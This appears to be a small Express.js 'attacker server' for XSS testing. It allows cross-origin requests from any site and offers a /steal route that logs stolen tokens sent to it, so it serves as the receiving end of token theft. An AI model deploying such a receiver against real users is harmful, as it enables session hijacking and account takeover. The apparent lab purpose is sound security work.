const express = require('express');
const app = express();
const port = 3001;

app.use(express.json());

// Enable CORS for XSS testing
app.use((req, res, next) => {
  res.header('Access-Control-Allow-Origin', '*');
  res.header('Access-Control-Allow-Headers', 'Origin, X-Requested-With, Content-Type, Accept');
  next();
});

// Route to capture stolen tokens
app.get('/steal', (req, res) => {
  console.log('🚨 TOKEN STOLEN:', req.query.token);
  res.send('Token received');
});

app.listen(port, () => {
  console.log(`Attacker server running at http://localhost:${port}`);
});
